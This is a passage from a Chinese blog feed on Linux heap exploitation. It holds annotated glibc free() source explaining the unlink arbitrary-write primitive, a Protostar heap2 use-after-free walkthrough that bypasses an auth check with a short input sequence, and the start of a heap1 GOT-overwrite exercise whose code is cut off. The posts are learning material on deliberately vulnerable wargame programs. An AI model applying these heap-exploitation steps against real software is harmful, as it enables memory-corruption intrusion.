<span class="number">0</span>;</div><div class="line"></div><div class="line">  <span class="built_in">size</span> = chunksize (p);</div><div class="line"></div><div class="line">  <span class="comment">/* Little security check which won't hurt performance: the</span></div><div class="line">     allocator never wrapps around at the end of the address space.</div><div class="line">     Therefore we can exclude some size values which might appear</div><div class="line">     here by accident or by "design" from some intruder.  */</div><div class="line">  <span class="comment">//一些安全检查</span></div><div class="line">  <span class="keyword">if</span> (<span class="variable">__builtin_expect</span> ((uintptr_t) p &gt; (uintptr_t) -<span class="built_in">size</span>, <span class="number">0</span>)</div><div class="line">      || <span class="variable">__builtin_expect</span> (misaligned_chunk (p), <span class="number">0</span>))</div><div class="line">    &#123;</div><div class="line">      errstr = <span class="string">"free(): invalid pointer"</span>;</div><div class="line">    errout:</div><div class="line">      <span class="keyword">if</span> (!have_lock &amp;&amp; <span class="built_in">locked</span>)</div><div class="line">        <span class="variable">__libc_lock_unlock</span> (av-&gt;mutex);</div><div class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</div><div class="line">      return;</div><div class="line">    &#125;</div><div class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT.  */</span></div><div class="line">   <span class="comment">//检查是否满足大于等于最小大小</span></div><div class="line">  <span class="keyword">if</span> (<span class="variable">__glibc_unlikely</span> (<span class="built_in">size</span> &lt; MINSIZE || !aligned_OK (<span class="built_in">size</span>)))</div><div class="line">    &#123;</div><div class="line">      errstr = <span class="string">"free(): invalid size"</span>;</div><div class="line">      <span class="built_in">goto</span> errout;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  check_inuse_chunk(av, p); <span class="comment">//检查当前chunk是否在使用</span></div><div class="line"></div><div class="line">  <span class="comment">/*</span></div><div class="line">    如果满足，则将该chunk放入fastbin以便malloc时能够快速找到和使用</div><div class="line">  */</div><div class="line">  <span class="keyword">if</span> ((unsigned long)(<span class="built_in">size</span>) &lt;= (unsigned long)(get_max_fast ())</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></div><div class="line">      <span class="comment">/*</span></div><div class="line">        If TRIM_FASTBINS set, don't place chunks</div><div class="line">        bordering top into fastbins</div><div class="line">      */</div><div class="line">      &amp;&amp; (chunk_at_offset(p, <span class="built_in">size</span>) != av-&gt;top)</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">      ) &#123;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="variable">__builtin_expect</span> (chunksize_nomask (chunk_at_offset (p, <span class="built_in">size</span>))</div><div class="line">                          &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</div><div class="line">        || <span class="variable">__builtin_expect</span> (chunksize (chunk_at_offset (p, <span class="built_in">size</span>))</div><div class="line">                             &gt;= av-&gt;system_mem, <span class="number">0</span>))</div><div class="line">      &#123;</div><div class="line">        <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></div><div class="line">           of system_mem might have let to a false positive.  Redo the test</div><div class="line">           after getting the lock.  */</div><div class="line">        <span class="keyword">if</span> (have_lock</div><div class="line">            || (&#123; <span class="built_in">assert</span> (<span class="built_in">locked</span> == <span class="number">0</span>);</div><div class="line">                  <span class="variable">__libc_lock_lock</span> (av-&gt;mutex);</div><div class="line">                  <span class="built_in">locked</span> = <span class="number">1</span>;</div><div class="line">                  chunksize_nomask (chunk_at_offset (p, <span class="built_in">size</span>)) &lt;= <span class="number">2</span> * SIZE_SZ</div><div class="line">                    || chunksize (chunk_at_offset (p, <span class="built_in">size</span>)) &gt;= av-&gt;system_mem;</div><div class="line">              &#125;))</div><div class="line">          &#123;</div><div class="line">            errstr = <span class="string">"free(): invalid next size (fast)"</span>;</div><div class="line">            <span class="built_in">goto</span> errout;</div><div class="line">          &#125;</div><div class="line">        <span class="keyword">if</span> (! have_lock)</div><div class="line">          &#123;</div><div class="line">            <span class="variable">__libc_lock_unlock</span> (av-&gt;mutex);</div><div class="line">            <span class="built_in">locked</span> = <span class="number">0</span>;</div><div class="line">          &#125;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">    free_perturb (chunk2mem(p), <span class="built_in">size</span> - <span class="number">2</span> * SIZE_SZ);</div><div class="line"></div><div class="line">    set_fastchunks(av);</div><div class="line">    unsigned int idx = fastbin_index(<span class="built_in">size</span>);</div><div class="line">    fb = &amp;fastbin (av, idx);</div><div class="line"></div><div class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></div><div class="line">    mchunkptr old = *fb, old2;</div><div class="line">    unsigned int old_idx = ~<span class="number">0</span>u;</div><div class="line">    <span class="keyword">do</span></div><div class="line">      &#123;</div><div class="line">        <span class="comment">/* Check that the top of the bin is not the record we are going to add</span></div><div class="line">           (i.e., double free).  */</div><div class="line">        <span class="keyword">if</span> (<span class="variable">__builtin_expect</span> (old == p, <span class="number">0</span>))</div><div class="line">          &#123;</div><div class="line">            errstr = <span class="string">"double free or corruption (fasttop)"</span>;</div><div class="line">            <span class="built_in">goto</span> errout;</div><div class="line">          &#125;</div><div class="line">        <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></div><div class="line">           size of the chunk that we are adding.  We can dereference OLD</div><div class="line">           only if we have the lock, otherwise it might have already been</div><div class="line">           deallocated.  See use of OLD_IDX below for the actual check.  */</div><div class="line">        <span class="keyword">if</span> (have_lock &amp;&amp; old != NULL)</div><div class="line">          old_idx = fastbin_index(chunksize(old));</div><div class="line">        p-&gt;fd = old2 = old;</div><div class="line">      &#125;</div><div class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != NULL &amp;&amp; <span class="variable">__builtin_expect</span> (old_idx != idx, <span class="number">0</span>))</div><div class="line">      &#123;</div><div class="line">        errstr = <span class="string">"invalid fastbin entry (free)"</span>;</div><div class="line">        <span class="built_in">goto</span> errout;</div><div class="line">      &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">/*</span></div><div class="line">    Consolidate other non-mmapped chunks as they arrive.</div><div class="line">  */</div><div class="line">  <span class="comment">//检查是否是通过mmap()分配的内存</span></div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</div><div class="line">    <span class="keyword">if</span> (! have_lock) &#123;</div><div class="line">      <span class="variable">__libc_lock_lock</span> (av-&gt;mutex);</div><div class="line">      <span class="built_in">locked</span> = <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    nextchunk = chunk_at_offset(p, <span class="built_in">size</span>);<span class="comment">//返回下一个chunk的地址</span></div><div class="line"></div><div class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></div><div class="line">       top block.  */</div><div class="line">    <span class="comment">//检查下一个是否为top-chunk</span></div><div class="line">    <span class="keyword">if</span> (<span class="variable">__glibc_unlikely</span> (p == av-&gt;top))</div><div class="line">      &#123;</div><div class="line">        errstr = <span class="string">"double free or corruption (top)"</span>;</div><div class="line">        <span class="built_in">goto</span> errout;</div><div class="line">      &#125;</div><div class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></div><div class="line">    <span class="keyword">if</span> (<span class="variable">__builtin_expect</span> (contiguous (av)</div><div class="line">                          &amp;&amp; (char *) nextchunk</div><div class="line">                          &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</div><div class="line">      &#123;</div><div class="line">        errstr = <span class="string">"double free or corruption (out)"</span>;</div><div class="line">        <span class="built_in">goto</span> errout;</div><div class="line">      &#125;</div><div class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></div><div class="line">    <span class="keyword">if</span> (<span class="variable">__glibc_unlikely</span> (!prev_inuse(nextchunk)))</div><div class="line">      &#123;</div><div class="line">        errstr = <span class="string">"double free or corruption (!prev)"</span>;</div><div class="line">        <span class="built_in">goto</span> errout;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">    nextsize = chunksize(nextchunk);</div><div class="line">    <span class="keyword">if</span> (<span class="variable">__builtin_expect</span> (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</div><div class="line">        || <span class="variable">__builtin_expect</span> (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</div><div class="line">      &#123;</div><div class="line">        errstr = <span class="string">"free(): invalid next size (normal)"</span>;</div><div class="line">        <span class="built_in">goto</span> errout;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">    free_perturb (chunk2mem(p), <span class="built_in">size</span> - <span class="number">2</span> * SIZE_SZ);</div><div class="line"></div><div class="line">    <span class="comment">/* 与后面chunk一个合并 */</span></div><div class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</div><div class="line">      prevsize = prev_size (p);</div><div class="line">      <span class="built_in">size</span> += prevsize;</div><div class="line">      p = chunk_at_offset(p, -((long) prevsize));</div><div class="line">      unlink(av, p, bck, fwd);<span class="comment">//将后一个chunk从双向链表上取下来</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</div><div class="line">      <span class="comment">/* get and clear inuse bit */</span></div><div class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</div><div class="line"></div><div class="line">      <span class="comment">/* 与前面chunk一个合并*/</span></div><div class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</div><div class="line">        unlink(av, nextchunk, bck, fwd);<span class="comment">//将前一个chunk从双向链表上取下来</span></div><div class="line">        <span class="built_in">size</span> += nextsize;</div><div class="line">      &#125; <span class="keyword">else</span></div><div class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</div><div class="line"></div><div class="line">      <span class="comment">/*</span></div><div class="line">        Place the chunk in unsorted chunk list. Chunks are</div><div class="line">        not placed into regular bins until after they have</div><div class="line">        been given one chance to be used in malloc.</div><div class="line">      */</div><div class="line"></div><div class="line">      bck = unsorted_chunks(av);</div><div class="line">      fwd = bck-&gt;fd;</div><div class="line">      <span class="keyword">if</span> (<span class="variable">__glibc_unlikely</span> (fwd-&gt;bk != bck))</div><div class="line">        &#123;</div><div class="line">          errstr = <span class="string">"free(): corrupted unsorted chunks"</span>;</div><div class="line">          <span class="built_in">goto</span> errout;</div><div class="line">        &#125;</div><div class="line">      p-&gt;fd = fwd;</div><div class="line">      p-&gt;bk = bck;</div><div class="line">      <span class="keyword">if</span> (!in_smallbin_range(<span class="built_in">size</span>))</div><div class="line">        &#123;</div><div class="line">          p-&gt;fd_nextsize = NULL;</div><div class="line">          p-&gt;bk_nextsize = NULL;</div><div class="line">        &#125;</div><div class="line">      bck-&gt;fd = p;</div><div class="line">      fwd-&gt;bk = p;</div><div class="line"></div><div class="line">      set_head(p, <span class="built_in">size</span> | PREV_INUSE);</div><div class="line">      set_foot(p, <span class="built_in">size</span>);</div><div class="line"></div><div class="line">      check_free_chunk(av, p);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">/*</span></div><div class="line">      如果当前chunk正好与topchunk相邻，则合并到topchunk</div><div class="line">    */</div><div class="line"></div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">      <span class="built_in">size</span> += nextsize;</div><div class="line">      set_head(p, <span class="built_in">size</span> | PREV_INUSE);</div><div class="line">      av-&gt;top = p;</div><div class="line">      check_chunk(av, p);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">/*</span></div><div class="line">      If freeing a large space, consolidate possibly-surrounding</div><div class="line">      chunks. Then, if the total unused topmost memory exceeds trim</div><div class="line">      threshold, ask malloc_trim to reduce top.</div><div class="line"></div><div class="line">      Unless max_fast is 0, we don't know if there are fastbins</div><div class="line">      bordering top, so we cannot tell for sure whether threshold</div><div class="line">      has been reached unless fastbins are consolidated.  But we</div><div class="line">      don't want to consolidate on each free.  As a compromise,</div><div class="line">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</div><div class="line">      is reached.</div><div class="line">    */</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ((unsigned long)(<span class="built_in">size</span>) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</div><div class="line">      <span class="keyword">if</span> (have_fastchunks(av))</div><div class="line">        malloc_consolidate(av);</div><div class="line"></div><div class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</div><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></div><div class="line">        <span class="keyword">if</span> ((unsigned long)(chunksize(av-&gt;top)) &gt;=</div><div class="line">            (unsigned long)(mp_.trim_threshold))</div><div class="line">          systrim(mp_.top_pad, av);</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></div><div class="line">           large, because the corresponding heap might go away.  */</div><div class="line">        heap_info *heap = heap_for_ptr(top(av));</div><div class="line"></div><div class="line">        <span class="built_in">assert</span>(heap-&gt;ar_ptr == av);</div><div class="line">        heap_trim(heap, mp_.top_pad);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (! have_lock) &#123;</div><div class="line">      <span class="built_in">assert</span> (<span class="built_in">locked</span>);</div><div class="line">      <span class="variable">__libc_lock_unlock</span> (av-&gt;mutex);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">/*</span></div><div class="line">    If the chunk was allocated via mmap, release via munmap().</div><div class="line">  */</div><div class="line"></div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    munmap_chunk (p);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这里看看<code>unlink()</code>宏定义</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">#define</span> unlink( P, <span class="keyword">BK, </span>FD ) &#123;            </div><div class="line">    <span class="keyword">BK </span>= P-&gt;<span class="keyword">bk; </span>                         </div><div class="line">    FD = P-&gt;fd<span class="comment">;                          </span></div><div class="line">    FD-&gt;<span class="keyword">bk </span>= <span class="keyword">BK; </span> //可能会造成任意写                       </div><div class="line">    <span class="keyword">BK-&gt;fd </span>= FD<span class="comment">;                         </span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>现在我们重点放在<code>unlink()</code>，当两个相邻chunk需要合并的时候，势必需要将临近的chunk从原来的双链表上取下来，然后与当前chunk合并成一个更大的块。等等！怎么取下来的呢？如果这里存在一个恶意的chunk即fd和bk都是一些恶意地址指针，则会出现任意地址写的一个漏洞。在这里我们就先不去讨论进一步的利用过程，只需知道存在一个这样的漏洞即可，后面会根据这个分析去漏洞利用。</p><p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#__libc_free" target="_blank" rel="external">glibc/malloc.c源码</a></p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><ol><li><a href="http://phrack.org/issues/57/8.html#article" target="_blank" rel="external">Vudo malloc tricks</a></li><li><a href="http://gee.cs.oswego.edu/dl/html/malloc.html" target="_blank" rel="external">A Memory Allocator</a></li><li><a href="http://phrack.org/issues/57/9.html#article" target="_blank" rel="external">Once upon a free()</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 当学习漏洞利用到一定阶段的时候，就需要对操作系统层面有足够的认识。无疑Linux
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/linux/"/>
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
      <category term="malloc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/malloc/"/>
    
      <category term="free" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/free/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-堆溢出学习-UAF(use after free)</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/21/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/21/Protostar-堆溢出系列学习-heap 2/Protostar-堆溢出系列学习-heap 2/</id>
    <published>2017-04-21T03:12:19.000Z</published>
    <updated>2017-05-02T14:34:52.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p>下面看一个堆中常见的漏洞-UAF(use after free)</p></blockquote><h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> auth &#123;</div><div class="line">  <span class="keyword">char</span> name[<span class="number">32</span>];</div><div class="line">  <span class="keyword">int</span> auth;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> auth *auth;</div><div class="line"><span class="keyword">char</span> *service;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> line[<span class="number">128</span>];</div><div class="line"></div><div class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"[ auth = %p, service = %p ]\n"</span>, auth, service);</div><div class="line"></div><div class="line">      <span class="keyword">if</span>(fgets(line, <span class="keyword">sizeof</span>(line), <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) <span class="keyword">break</span>;</div><div class="line">      </div><div class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(line, <span class="string">"auth "</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</div><div class="line">          auth = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(auth));</div><div class="line">          <span class="built_in">memset</span>(auth, <span class="number">0</span>, <span class="keyword">sizeof</span>(auth));</div><div class="line">          <span class="keyword">if</span>(<span class="built_in">strlen</span>(line + <span class="number">5</span>) &lt; <span class="number">31</span>) &#123;</div><div class="line">              <span class="built_in">strcpy</span>(auth-&gt;name, line + <span class="number">5</span>);</div><div class="line">          &#125;</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(line, <span class="string">"reset"</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</div><div class="line">          <span class="built_in">free</span>(auth);</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(line, <span class="string">"service"</span>, <span class="number">6</span>) == <span class="number">0</span>) &#123;</div><div class="line">          service = strdup(line + <span class="number">7</span>);</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(line, <span class="string">"login"</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</div><div class="line">          <span class="keyword">if</span>(auth-&gt;auth) &#123;</div><div class="line">              <span class="built_in">printf</span>(<span class="string">"you have logged in already!\n"</span>);</div><div class="line">          &#125; <span class="keyword">else</span> &#123;</div><div class="line">              <span class="built_in">printf</span>(<span class="string">"please enter your password\n"</span>);</div><div class="line">          &#125;</div><div class="line">      &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-分析-amp-思考"><a href="#0x02-分析-amp-思考" class="headerlink" title="0x02 分析&amp;思考"></a>0x02 分析&amp;思考</h2><p>程序有4个命令，对<code>auth</code>这个结构体进行分配内存以及释放内存，然后有结构体里的<code>auth-&gt;auth</code>来决定是否授权。很明显让我们修改<code>auth-&gt;auth</code>的值。<br>reset命令释放<code>auth</code>但没有设为null，后面<code>auth-&gt;auth</code>发生引用。所以这里有个UAF漏洞。</p><h2 id="0x03-调试-amp-hack"><a href="#0x03-调试-amp-hack" class="headerlink" title="0x03 调试&amp;hack"></a>0x03 调试&amp;hack</h2><p>1.在第一个printf处下个断点，观察每次分配和释放后堆，auth以及service的情况</p><p>2.先输入<code>auth admin</code>，然后输入<code>login</code>试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-0.png?raw=true" alt="0-0"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/nologin.png?raw=true" alt="nologin"><br>3.再输入<code>reset</code>释放堆内存<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-1.png?raw=true" alt="0-1"><br>4.输入<code>service</code>分配内存<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-2.png?raw=true" alt="0-2"><br>5.以上我们可以发现，给service分配的内存居然也指向auth的地址？因为之前free了auth，所以系统认为这段内存为可用，当再次分配的时候就会返回对应内存。基于此，我们继续给service分配内存，让其覆盖<code>auth-&gt;auth</code>的内存值。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-3.png?raw=true" alt="0-3"><br>6.再次输入<code>login</code>命令<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-4.png?raw=true" alt="0-4"></p><h2 id="0x04-一点感受"><a href="#0x04-一点感受" class="headerlink" title="0x04 一点感受"></a>0x04 一点感受</h2><p>通过这个例子简单的学习了UAF漏洞后，无疑free后不设为null，后果是不敢想象的。继续学习堆相关的漏洞利用。keep hack！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;下面看一个堆中常见的漏洞-UAF(use after free)&lt;/p&gt;
&lt;/bl
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="堆溢出" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
      <category term="UAF" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/UAF/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-堆溢出学习-strcpy堆指针造成任意地址GOT表写</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/19/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%201/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%201/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/19/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/</id>
    <published>2017-04-19T03:12:19.000Z</published>
    <updated>2017-05-02T14:34:42.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p> 现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。</p></blockquote><h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> internet &#123;</div><div class="line">  <span class="keyword">int</span> priority;</div><div class="line">  <span class="keyword">char</span> *name;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"and we have a winner @ %d\n"</span>, time(<span class="literal">NULL</span>));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">struct</span> internet *i1, *i2, *i3;</div><div class="line"></div><div class="line">  i1 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> internet));</div><div class="line">  i1-&gt;priority = <span class="number">1</span>;</div><div class="line">  i1-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">  i2 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> internet));</div><div class="line">  i2-&gt;priority = <span class="number">2</span>;</div><div class="line">  i2-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">  <span class="built_in">strcpy</span>(i1-&gt;name, argv[<span class="number">1</span>]);</div><div class="line">  <span class="built_in">strcpy</span>(i2-&gt;name, argv[<span class="number">2</span>]);</div><div class="line"></div><div class="line"> 